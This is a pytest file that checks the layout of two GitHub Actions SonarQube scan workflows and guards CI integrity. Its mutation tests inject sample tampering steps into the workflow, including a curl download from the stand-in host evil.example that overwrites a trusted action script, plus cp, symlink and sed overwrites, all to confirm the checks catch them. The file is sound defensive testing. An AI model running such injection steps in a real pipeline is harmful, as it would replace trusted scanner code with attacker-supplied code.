"""Structural checks over the reusable workflows' step layout.

Both workflows check the caller's repository out under a subdirectory
(``src``), never at the workspace root, and check this action's own source
(``.sast-sonarqube``) and the fallback baseline checkout
(``.baseline-checkout``) into separate sibling directories instead. These
tests pin the invariants that layout depends on:

* no checkout lands at the workspace root: the caller's own code (PR head
  or pushed branch) goes under ``src``, and this action's own source and the
  fallback baseline into sibling directories - so they never share a
  directory with the caller's content, and checking the caller's code out
  can't wipe (or replace) this action's own source, whichever order they
  run in;
* neither sibling directory (``.sast-sonarqube`` or ``.baseline-checkout``)
  lies under any directory passed to the scanner as ``project-base-dir``,
  for every step that invokes the scanner (``uses: ./.sast-sonarqube``);
* every checkout into a fixed `path:` (``src``, ``.sast-sonarqube``,
  ``.baseline-checkout``) is immediately preceded by a step that removes
  that path, under the same `if:` condition - clearing each fixed checkout
  path before use, independent of what an earlier job on the same runner
  left behind there; and
* no `run:` step writes its intermediate files to a workspace-relative path -
  scratch files go under $RUNNER_TEMP instead (redirects, `tee`, `cp`/`mv`,
  `-o`/`--out`-style flags, following local variable assignments);
* no step after the ``.sast-sonarqube`` checkout mentions that directory
  except to read from it.

And, for the scanner-mode dotnet trust boundary (sonar-pr.yml):

* every checkout sets ``persist-credentials: false``;
* the PR head checkout (and the removal before it) and the PR head scan
  carry the positive allowlist ``if:`` on the resolved PR context, and
  come after the steps that resolve that context and gate fork PRs;
* the PR head checkout checks out the SHA resolve_pr_context.py resolved
  (on a dispatch, the maintainer-reviewed one), into ``src``.
"""
import posixpath
import re
from pathlib import Path

import pytest
import yaml

WORKFLOWS_DIR = Path(__file__).resolve().parent.parent / ".github" / "workflows"
WORKFLOWS = ["sonar-pr.yml", "sonar-baseline.yml"]

SCANNER_ACTION_USES = "./.sast-sonarqube"
SIBLING_DIRS = {".sast-sonarqube", ".baseline-checkout"}

ALLOWED_EXACT_TARGETS = {
    "$GITHUB_OUTPUT",
    "${GITHUB_OUTPUT}",
    "$GITHUB_ENV",
    "${GITHUB_ENV}",
    "$GITHUB_STEP_SUMMARY",
    "${GITHUB_STEP_SUMMARY}",
    "/dev/null",
}
ALLOWED_TARGET_PREFIXES = ("$RUNNER_TEMP/", "${RUNNER_TEMP}/")

ARITHMETIC = re.compile(r"\(\(.*?\)\)")
REDIRECT = re.compile(r"\d?>>?(?!&)\s*([^\s;|&)]+)")
TEE = re.compile(r"\btee(?:\s+-a)?\s+([^\s;|&)]+)")
OUTPUT_FLAG = re.compile(r"--(?:out|removed-out|result-out|dest|output)[\s=]+([^\s;|&)]+)")
# Ported from #54's scripts/check_checkout_order.py (a11bf90):
# short `-o value` / `-o=value`, excluding `set -o <shell-option>` (and
# `set -euo pipefail`, where -o isn't a separate token anyway).
SHORT_OUTPUT_FLAG = re.compile(r"(?<!\S)(?<!set )-o(?:=|\s+)([^\s;|&)]+)")
# `cp`/`mv`: their arguments up to the next pipe/control operator or end
# of line; only the last (destination) one is written.
CP_MV_ARGS = re.compile(r"(?<!\S)(?:cp|mv)\b([^|;&\n]*)")
# One-line `name=value` / `name="value"` assignments, so a path assigned
# to a local variable once is checked as that path, not as "$name".
ASSIGNMENT = re.compile(r"^\s*([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
VAR_REF = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")


def _steps(workflow):
    data = yaml.safe_load((WORKFLOWS_DIR / workflow).read_text())
    for job_name, job in data["jobs"].items():
        yield job_name, job.get("steps", [])


def _scan_steps(workflow):
    """Every step that invokes the scanner composite action directly (not
    reusable-workflow calls - there are none of those here)."""
    for job_name, steps in _steps(workflow):
        for step in steps:
            if str(step.get("uses", "")) == SCANNER_ACTION_USES:
                yield job_name, step


def _local_assignments(text):
    assignments = {}
    for line in text.splitlines():
        match = ASSIGNMENT.match(line)
        if match:
            name, value = match.groups()
            assignments[name] = value.strip().strip("\"'")
    return assignments


def _resolve_target(target, assignments, seen=frozenset()):
    """Follow a bare `$VAR`/`${VAR}` to its value assigned in the same
    `run:` block. Anything else (or a cycle, or a variable never assigned
    there) is returned unchanged - and so is never mistaken for an allowed
    $RUNNER_TEMP path."""
    match = VAR_REF.match(target)
    if not match or match.group(1) in seen or match.group(1) not in assignments:
        return target
    return _resolve_target(assignments[match.group(1)], assignments, seen | {match.group(1)})


def _write_targets(script):
    lines = [line for line in script.splitlines() if not line.lstrip().startswith("#")]
    # Drop bash arithmetic `(( ... ))`, where `>` is a comparison.
    text = ARITHMETIC.sub("", "\n".join(lines))
    assignments = _local_assignments(text)
    targets = []
    for pattern in (REDIRECT, TEE, OUTPUT_FLAG, SHORT_OUTPUT_FLAG):
        for match in pattern.finditer(text):
            targets.append((match.start(), match.group(1).strip("\"'")))
    for match in CP_MV_ARGS.finditer(text):
        args = [a.strip("\"'") for a in match.group(1).split() if not a.startswith("-")]
        if len(args) >= 2:
            targets.append((match.start(), args[-1]))
    for _, target in sorted(targets, key=lambda t: t[0]):
        yield _resolve_target(target, assignments)


def _is_allowed_target(target):
    return target in ALLOWED_EXACT_TARGETS or target.startswith(ALLOWED_TARGET_PREFIXES)


# Commands that change files; a line naming `.sast-sonarqube` alongside
# one of these (or a redirect) is treated as modifying it.
MUTATING_COMMAND = re.compile(
    r"(?<![\w./-])(?:rm|rmdir|ln|cp|mv|curl|wget|tee|chmod|chown|touch|mkdir|install|tar|unzip|"
    r"git|rsync|dd|truncate|patch)(?![\w./-])|(?<![\w-])sed\s+(?:-\w*\s+)*-i|>"
)
# A read of a file inside the action source: `.sast-sonarqube/<path>`.
ACTION_SOURCE_READ = re.compile(r"(?<![\w./-])\.sast-sonarqube/[\w./-]+")


def _only_reads_action_source(step):
    """True when `step` touches `.sast-sonarqube` only to read from it:
    `uses: ./.sast-sonarqube`, or `run:` lines that name a file inside it
    (to run a script, or read its compose file) with no command that
    writes. Anything else mentioning it - a bare `.sast-sonarqube`
    argument, a mutating command, `working-directory:` or a checkout
    `path:` into it - counts as modifying it."""
    for key, value in step.items():
        if key == "uses" and value == SCANNER_ACTION_USES:
            continue
        if key == "run":
            for line in str(value).splitlines():
                if ".sast-sonarqube" not in line:
                    continue
                if MUTATING_COMMAND.search(line):
                    return False
                if ".sast-sonarqube" in ACTION_SOURCE_READ.sub("", line):
                    return False
            continue
        if ".sast-sonarqube" in str(value):
            return False
    return True


def _lies_under(sibling, prefix_dir):
    """Whether `sibling` (a fixed, top-level directory name) lies under
    `prefix_dir` (the literal, non-templated portion of a project-base-dir
    value), after normalizing `.`/`..` segments (so `src/..` is the
    workspace root). Everything lies under the workspace root; otherwise,
    since every sibling directory lives directly at the workspace root, only
    a strict descendant relationship counts - `prefix_dir` being the sibling
    itself (e.g. scanning `.baseline-checkout` directly) is not "under"."""
    normalized = posixpath.normpath(prefix_dir) if prefix_dir else "."
    if normalized == "." or normalized.startswith("../") or normalized == "..":
        return True
    return sibling.startswith(normalized.rstrip("/") + "/")


def _checkout_steps(steps):
    return [s for s in steps if str(s.get("uses", "")).startswith("actions/checkout@")]


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_no_checkout_is_at_workspace_root(workflow):
    found = False
    for job_name, steps in _steps(workflow):
        for checkout in _checkout_steps(steps):
            found = True
            path = (checkout.get("with") or {}).get("path")
            assert path, (
                f"{workflow}:{job_name}: checkout {checkout.get('name')!r} "
                "has no `path:` - it checks out at the workspace root"
            )
            assert path not in (".", "./", "") and "github.workspace" not in str(path), (
                f"{workflow}:{job_name}: checkout path {path!r} is the workspace root"
            )
    assert found, f"{workflow}: expected at least one checkout step"


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_caller_code_is_checked_out_into_src(workflow):
    """The checkout scanned through `src/${{ inputs.project-base-dir }}`
    exists: exactly one checkout of the caller's own repository (no
    `repository:` override) targets `src`."""
    for job_name, steps in _steps(workflow):
        caller = [
            s
            for s in _checkout_steps(steps)
            if "repository" not in (s.get("with") or {}) and (s.get("with") or {}).get("path") == "src"
        ]
        assert len(caller) == 1, f"{workflow}:{job_name}: expected exactly one caller checkout into src"


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_every_checkout_disables_persisted_credentials(workflow):
    for job_name, steps in _steps(workflow):
        for checkout in _checkout_steps(steps):
            assert (checkout.get("with") or {}).get("persist-credentials") is False, (
                f"{workflow}:{job_name}: checkout {checkout.get('name')!r} persists "
                "the job's GITHUB_TOKEN into .git/config"
            )


PR_ALLOWLIST_IF = """contains(fromJSON('["scan","dispatch"]'), steps.pr-context.outputs.action)"""


def _pr_steps():
    return dict(_steps("sonar-pr.yml"))["pr-scan"]


def _index_of(steps, name):
    names = [s.get("name") for s in steps]
    assert name in names, f"sonar-pr.yml: no step named {name!r}"
    return names.index(name)


def test_pr_head_checkout_and_scan_carry_the_positive_allowlist():
    steps = _pr_steps()
    for name in ("Clear caller checkout directory", "Checkout PR head", "Scan PR head"):
        step = steps[_index_of(steps, name)]
        assert step.get("if") == PR_ALLOWLIST_IF, f"sonar-pr.yml: {name!r} has if: {step.get('if')!r}"


def test_pr_head_is_checked_out_only_after_the_context_and_fork_gate():
    steps = _pr_steps()
    context = _index_of(steps, "Resolve PR/dispatch context")
    gate = _index_of(steps, "Gate: scanner-mode dotnet blocks an automatic fork-PR scan")
    first_caller_checkout = min(
        i
        for i, s in enumerate(steps)
        if str(s.get("uses", "")).startswith("actions/checkout@") and "repository" not in (s.get("with") or {})
    )
    assert context < gate < first_caller_checkout
    assert steps[gate].get("if") == "steps.pr-context.outputs.action == 'block'"


def test_pr_head_checkout_uses_the_resolved_sha_into_src():
    steps = _pr_steps()
    checkout = steps[_index_of(steps, "Checkout PR head")]
    assert checkout["with"]["ref"] == "${{ steps.pr-context.outputs.head-sha }}"
    assert checkout["with"]["path"] == "src"


def test_action_source_is_checked_out_once_before_any_use():
    for workflow in WORKFLOWS:
        for job_name, steps in _steps(workflow):
            action_checkouts = [
                i
                for i, s in enumerate(steps)
                if str(s.get("uses", "")).startswith("actions/checkout@")
                and (s.get("with") or {}).get("path") == ".sast-sonarqube"
            ]
            assert len(action_checkouts) == 1, f"{workflow}:{job_name}: expected one checkout of this action's source"
            for i, step in enumerate(steps):
                run = str(step.get("run", ""))
                if run.strip() == "rm -rf -- ./.sast-sonarqube":
                    continue  # clearing the path before the checkout, not a use
                text = run + str(step.get("uses", ""))
                if ".sast-sonarqube/" in text or text.endswith("./.sast-sonarqube"):
                    assert i > action_checkouts[0], (
                        f"{workflow}:{job_name}: step {step.get('name')!r} uses .sast-sonarqube before it is checked out"
                    )


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_sibling_dirs_not_under_scanned_project_base_dir(workflow):
    checked = 0
    for job_name, step in _scan_steps(workflow):
        value = (step.get("with") or {}).get("project-base-dir", "")
        checked += 1
        # The literal, non-templated prefix this workflow prepends, before
        # any `${{ ... }}` expression (e.g. the caller's own
        # project-base-dir input).
        prefix_dir = value.split("${{", 1)[0].rstrip("/")
        for sibling in SIBLING_DIRS:
            assert not _lies_under(sibling, prefix_dir), (
                f"{workflow}:{job_name}: {sibling} lies under the project-base-dir "
                f"passed to the scanner ({value!r}, resolved prefix {prefix_dir!r})"
            )
    assert checked > 0, f"{workflow}: expected at least one step invoking the scanner"


def _checkout_root_violations(workflow, job_name, steps):
    """Violations of the checkout-root contract for every scan step in
    this job: `checkout-root` must (a) equal the literal sibling directory
    its own `project-base-dir` is rooted under, (b) be the `path:` of an
    actual `actions/checkout` step earlier in the same job - not just a
    string that happens to match - and (c) never be `.sast-sonarqube`,
    the one checkout no scan step may ever be confined to (it is this
    action's own trusted source, not the caller's code or a baseline to
    compare against - see test_nothing_after_the_action_source_checkout_modifies_it).
    (c) matters on its own: `.sast-sonarqube` IS a real checkout `path:` in
    both workflows (this action's own source), so (b) alone would not
    catch a mutation that points a scan step at it."""
    violations = []
    checkout_paths = {
        (s.get("with") or {}).get("path") for s in _checkout_steps(steps) if (s.get("with") or {}).get("path")
    }
    for step in steps:
        if str(step.get("uses", "")) != SCANNER_ACTION_USES:
            continue
        with_block = step.get("with") or {}
        value = str(with_block.get("project-base-dir", ""))
        prefix_dir = value.split("${{", 1)[0].rstrip("/")
        checkout_root = with_block.get("checkout-root")
        label = f"{workflow}:{job_name}:{step.get('name')}"
        if not prefix_dir:
            violations.append(f"{label}: project-base-dir {value!r} has no literal checkout-root prefix")
            continue
        if checkout_root != prefix_dir:
            violations.append(
                f"{label}: checkout-root {checkout_root!r} does not match "
                f"project-base-dir's checkout prefix {prefix_dir!r}"
            )
        if checkout_root not in checkout_paths:
            violations.append(
                f"{label}: checkout-root {checkout_root!r} is not the `path:` of any "
                f"actions/checkout step in this job (found: {sorted(p for p in checkout_paths if p)})"
            )
        if checkout_root == ".sast-sonarqube":
            violations.append(f"{label}: checkout-root must never be .sast-sonarqube")
    return violations


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_every_scan_step_passes_a_checkout_root_matching_its_checkout_path(workflow):
    """run_scan.sh confines `project-base-dir` to `checkout-root` (when
    set) instead of the whole workspace - a symlink committed into one
    sibling checkout (e.g. `src`) can otherwise resolve into another (this
    action's own source, or the fallback baseline checkout) and still pass
    a bare workspace check. See `_checkout_root_violations` for exactly
    what's required of every step that invokes the scanner."""
    checked = 0
    violations = []
    for job_name, steps in _steps(workflow):
        checked += sum(1 for s in steps if str(s.get("uses", "")) == SCANNER_ACTION_USES)
        violations.extend(_checkout_root_violations(workflow, job_name, steps))
    assert checked > 0, f"{workflow}: expected at least one step invoking the scanner"
    assert violations == [], "checkout-root wiring violations:\n" + "\n".join(violations)


def test_checkout_root_violations_catch_the_dot_sast_sonarqube_mutation():
    """Regression: a mutation that points a scan step's checkout-root (and
    project-base-dir's literal prefix) at `.sast-sonarqube` must be caught
    even though `.sast-sonarqube` is a real checkout `path:` in this job -
    see `_checkout_root_violations`'s (c)."""
    steps = list(_pr_steps())
    index = _index_of(steps, "Scan PR head")
    mutated = dict(steps[index])
    mutated["with"] = dict(mutated["with"])
    mutated["with"]["checkout-root"] = ".sast-sonarqube"
    mutated["with"]["project-base-dir"] = ".sast-sonarqube/${{ inputs.project-base-dir }}"
    steps[index] = mutated
    violations = _checkout_root_violations("sonar-pr.yml", "pr-scan", steps)
    assert any(".sast-sonarqube" in v for v in violations), violations


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_checkouts_into_fixed_path_are_preceded_by_removal(workflow):
    checked = 0
    for job_name, steps in _steps(workflow):
        for index, step in enumerate(steps):
            if not str(step.get("uses", "")).startswith("actions/checkout@"):
                continue
            path = (step.get("with") or {}).get("path")
            if path is None:
                continue
            checked += 1
            assert index > 0, f"{workflow}:{job_name}: checkout into {path} is the first step"
            previous = steps[index - 1]
            script = previous.get("run", "")
            removal = re.compile(rf"(^|\s)rm -rf -- \./{re.escape(path)}(\s|$)")
            assert removal.search(script), (
                f"{workflow}:{job_name}: checkout into {path!r} is not immediately "
                f"preceded by `rm -rf -- ./{path}`"
            )
            assert previous.get("if") == step.get("if"), (
                f"{workflow}:{job_name}: removal of {path!r} does not share the "
                "checkout's `if:` condition"
            )
    assert checked > 0, f"{workflow}: expected at least one checkout into a fixed path"


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_run_steps_write_only_under_runner_temp(workflow):
    offenders = []
    for job_name, steps in _steps(workflow):
        for step in steps:
            script = step.get("run")
            if not script:
                continue
            for target in _write_targets(script):
                if not _is_allowed_target(target):
                    offenders.append(f"{job_name} / {step.get('name')}: {target}")
    assert offenders == [], "workspace-relative write targets:\n" + "\n".join(offenders)


@pytest.mark.parametrize(
    "script, expected",
    [
        ('echo "x=1" >> "$GITHUB_OUTPUT"', ["$GITHUB_OUTPUT"]),
        ("git diff --name-only > changed-files.txt", ["changed-files.txt"]),
        ('cmd 2>&1 >&2 > /dev/null', ["/dev/null"]),
        ('tool --out "${RUNNER_TEMP}/a/b.json"', ["${RUNNER_TEMP}/a/b.json"]),
        ('tool --dest .baseline-artifact)"', [".baseline-artifact"]),
        ("} | tee -a \"$GITHUB_STEP_SUMMARY\"", ["$GITHUB_STEP_SUMMARY"]),
        ("# a comment > ignored.txt", []),
        ("if (( ${#items[@]} > 1 )); then echo x > out.txt; fi", ["out.txt"]),
    ],
)
def test_write_target_extraction(script, expected):
    assert list(_write_targets(script)) == expected


def test_allowed_targets():
    assert _is_allowed_target("${RUNNER_TEMP}/sonar-pr/changed-files.txt")
    assert _is_allowed_target("$GITHUB_OUTPUT")
    assert not _is_allowed_target("changed-files.txt")
    assert not _is_allowed_target("./.baseline-artifact")
    assert not _is_allowed_target("${RUNNER_TEMP}")


@pytest.mark.parametrize(
    "sibling, prefix_dir, expected",
    [
        (".sast-sonarqube", "", True),
        (".sast-sonarqube", ".", True),
        (".sast-sonarqube", "./", True),
        (".sast-sonarqube", "src", False),
        (".sast-sonarqube", "src/fixtures", False),
        (".baseline-checkout", ".baseline-checkout", False),
        (".sast-sonarqube", ".baseline-checkout", False),
        # Generic nested case, independent of the real sibling names: a
        # directory named "a/b" does lie under "a".
        ("a/b", "a", True),
    ],
)
def test_lies_under(sibling, prefix_dir, expected):
    assert _lies_under(sibling, prefix_dir) == expected


# A git subcommand that needs remote credentials against origin: `fetch`,
# `pull`, or `push` - anchored so it doesn't false-positive on a word like
# "gitfetcher" or match mid-identifier.
CREDENTIALED_GIT_SUBCOMMAND = re.compile(r"(?<![\w.-])git\s+(fetch|pull|push)\b")


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_every_checkout_disables_persisted_credentials(workflow):
    """A checked-out repo's embedded git credential helper is only needed by
    a later git command that talks to a remote (fetch/pull/push) - none of
    which this job needs (see test_no_git_command_needs_remote_credentials
    below) - so every checkout should set persist-credentials: false rather
    than leave a live credential sitting in the checkout's git config for
    the rest of the job."""
    checked = 0
    for job_name, steps in _steps(workflow):
        for step in steps:
            if not str(step.get("uses", "")).startswith("actions/checkout@"):
                continue
            checked += 1
            with_block = step.get("with") or {}
            assert with_block.get("persist-credentials") is False, (
                f"{workflow}:{job_name}: checkout {step.get('name')!r} does not "
                "set persist-credentials: false"
            )
    assert checked > 0, f"{workflow}: expected at least one checkout step"


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_no_git_command_needs_remote_credentials(workflow):
    """No `run:` step may need a credentialed git command (fetch/pull/push
    against origin) - this is what makes persist-credentials: false (above)
    safe to turn on for every checkout: resolving a base ref's history
    should rely on actions/checkout's own fetch-depth: 0 (which already
    populates refs/remotes/origin/* - see actions/checkout src/ref-helper.ts
    getRefSpecForAllHistory(), invoked whenever fetchDepth <= 0 per
    src/git-source-provider.ts), then verify locally with `git rev-parse
    --verify`, rather than fetch again with a live credential."""
    offenders = []
    for job_name, steps in _steps(workflow):
        for step in steps:
            script = step.get("run")
            if not script:
                continue
            for line in script.splitlines():
                if line.lstrip().startswith("#"):
                    continue
                match = CREDENTIALED_GIT_SUBCOMMAND.search(line)
                if match:
                    offenders.append(
                        f"{job_name} / {step.get('name')}: `git {match.group(1)}` - {line.strip()}"
                    )
    assert offenders == [], "git commands needing remote credentials:\n" + "\n".join(offenders)


@pytest.mark.parametrize(
    "line, expected",
    [
        ('git fetch origin "$BASE_REF"', "fetch"),
        ("git pull", "pull"),
        ("git push origin HEAD", "push"),
        ("git merge-base origin/main HEAD", None),
        ("git diff --name-only HEAD~1", None),
        ("git rev-parse --verify origin/main", None),
    ],
)
def test_credentialed_git_subcommand_pattern(line, expected):
    match = CREDENTIALED_GIT_SUBCOMMAND.search(line)
    assert (match.group(1) if match else None) == expected


# --- broader write detection (ported from #54's check_checkout_order.py) -----


@pytest.mark.parametrize(
    "script, expected",
    [
        # cp/mv: only the last (destination) argument is written.
        ("cp -f a.json b.json", ["b.json"]),
        ('mv "${RUNNER_TEMP}/x" out.json', ["out.json"]),
        ("cp a.json", []),
        # Short -o / -o=, but never `set -o <option>`.
        ("curl -sS -o report.json https://x", ["report.json"]),
        ("curl -o=report.json https://x", ["report.json"]),
        ("set -o pipefail", []),
        ("set -euo pipefail", []),
        ("tool --output result.json", ["result.json"]),
        # A local variable is resolved to what it was assigned.
        ('f="${RUNNER_TEMP}/sonar-pr/a.json"\necho x > "$f"', ["${RUNNER_TEMP}/sonar-pr/a.json"]),
        ('f=bare.json\necho x > "${f}"', ["bare.json"]),
        ('echo x > "$unassigned"', ["$unassigned"]),
        ('a="$b"\nb=bare.json\necho x > "$a"', ["bare.json"]),
        ('a="$a"\necho x > "$a"', ["$a"]),
    ],
)
def test_broader_write_target_extraction(script, expected):
    assert list(_write_targets(script)) == expected


# --- nothing after the action-source checkout modifies it --------------------


def _action_source_violations(steps):
    """Names of steps after the `.sast-sonarqube` checkout that mention
    `.sast-sonarqube` other than to read from it (run a script in it, use
    it as the composite action, read its compose file)."""
    checkout = next(
        i
        for i, s in enumerate(steps)
        if str(s.get("uses", "")).startswith("actions/checkout@")
        and (s.get("with") or {}).get("path") == ".sast-sonarqube"
    )
    return [
        step.get("name") or f"step[{i}]"
        for i, step in enumerate(steps)
        if i > checkout and not _only_reads_action_source(step)
    ]


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_nothing_after_the_action_source_checkout_modifies_it(workflow):
    for job_name, steps in _steps(workflow):
        assert _action_source_violations(steps) == [], f"{workflow}:{job_name}"


_INJECTED_STEPS = {
    "cp into it": {"name": "inject", "run": "cp evil.py .sast-sonarqube/scripts/apply_policy.py"},
    "curl -o into it": {
        "name": "inject",
        "run": "curl -sSfL -o .sast-sonarqube/scripts/diff_findings.py https://evil.example",
    },
    "rm it after the checkout": {"name": "inject", "run": "rm -rf -- ./.sast-sonarqube"},
    "ln -sfn over it": {"name": "inject", "run": "ln -sfn src/.sast-sonarqube .sast-sonarqube"},
    "mv over it": {"name": "inject", "run": "mv src/x .sast-sonarqube"},
    "redirect into it": {"name": "inject", "run": "echo x > .sast-sonarqube/action.yml"},
    "sed -i on it": {"name": "inject", "run": "sed -i s/a/b/ .sast-sonarqube/scripts/run_scan.sh"},
    "run inside it": {"name": "inject", "working-directory": ".sast-sonarqube", "run": "make"},
    "second checkout into it": {
        "name": "inject",
        "uses": "actions/checkout@v7",
        "with": {"path": ".sast-sonarqube"},
    },
}


@pytest.mark.parametrize("mutation", sorted(_INJECTED_STEPS))
def test_modifying_the_action_source_after_its_checkout_is_caught(mutation):
    steps = list(_pr_steps())
    # Injected right before "Scan PR head", well after the checkout.
    steps.insert(_index_of(steps, "Scan PR head"), _INJECTED_STEPS[mutation])
    assert "inject" in _action_source_violations(steps)


@pytest.mark.parametrize(
    "prefix_dir",
    ["src/..", "src/../", "./src/..", "src/./..", "src/x/../.."],
)
def test_lies_under_normalizes_dot_dot(prefix_dir):
    assert _lies_under(".sast-sonarqube", prefix_dir)
    assert _lies_under(".baseline-checkout", prefix_dir)


def test_scanning_src_dot_dot_is_caught():
    value = "src/../${{ inputs.project-base-dir }}"
    prefix_dir = value.split("${{", 1)[0].rstrip("/")
    assert any(_lies_under(sibling, prefix_dir) for sibling in SIBLING_DIRS)


# --- compose project name (run_scan.sh's network/URL lookup relies on it) -----


def _compose_up_steps(workflow):
    """Every step whose `run:` starts the ephemeral stack (`docker compose
    ... up`)."""
    for job_name, steps in _steps(workflow):
        for step in steps:
            script = step.get("run") or ""
            if re.search(r"\bdocker compose\b.*\bup\b", script):
                yield job_name, step, steps


def _writes_to_github_env(script, name):
    return bool(re.search(rf"{name}=.*>>\s*\"?\$GITHUB_ENV", script))


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_compose_project_name_and_port_are_per_run_and_exported_job_wide(workflow):
    """Every job shares one docker daemon with the other runners on its host,
    so a fixed compose project name and host port collide across concurrent
    jobs (one job's `down -v` removes another's stack, and both bind 9000).
    The project name and host port are therefore allocated per run by a step
    that exports them via $GITHUB_ENV *before* `docker compose up`, so every
    later step - including run_scan.sh's own network lookup - resolves the
    same project name. They are never set via `-p` or job/step `env:` (those
    would reach only some steps and silently push run_scan.sh onto the
    deprecated host-network fallback)."""
    data = yaml.safe_load((WORKFLOWS_DIR / workflow).read_text())
    assert "COMPOSE_PROJECT_NAME" not in (data.get("env") or {})
    checked = 0
    for job_name, job in data["jobs"].items():
        assert "COMPOSE_PROJECT_NAME" not in (job.get("env") or {})
        steps = job.get("steps") or []
        for idx, step in enumerate(steps):
            script = step.get("run") or ""
            if not re.search(r"\bdocker compose\b.*\bup\b", script):
                continue
            checked += 1
            assert not re.search(r"(^|\s)-p(\s|$)", script)
            assert "COMPOSE_PROJECT_NAME" not in (step.get("env") or {})
            alloc = [
                st for st in steps[:idx]
                if _writes_to_github_env(st.get("run") or "", "COMPOSE_PROJECT_NAME")
                and _writes_to_github_env(st.get("run") or "", "SONAR_HOST_PORT")
            ]
            assert alloc, f"{workflow}:{job_name}: no step before `up` exports COMPOSE_PROJECT_NAME and SONAR_HOST_PORT"
            body = alloc[0]["run"]
            for needed in ("GITHUB_RUN_ID", "GITHUB_RUN_ATTEMPT", "GITHUB_JOB"):
                assert needed in body, f"{workflow}:{job_name}: project name must include {needed}"
    assert checked > 0, f"{workflow}: expected a `docker compose ... up` step"


@pytest.mark.parametrize("workflow", WORKFLOWS)
def test_no_workflow_step_hardcodes_the_default_sonarqube_port(workflow):
    text = (WORKFLOWS_DIR / workflow).read_text()
    assert "localhost:9000" not in text, f"{workflow}: use the allocated SONAR_HOST_PORT"


def test_compose_publishes_the_allocated_host_port():
    compose = yaml.safe_load((WORKFLOWS_DIR.parent.parent / "docker-compose.ephemeral.yml").read_text())
    assert compose["services"]["sonarqube"]["ports"] == ["${SONAR_HOST_PORT:-9000}:9000"]
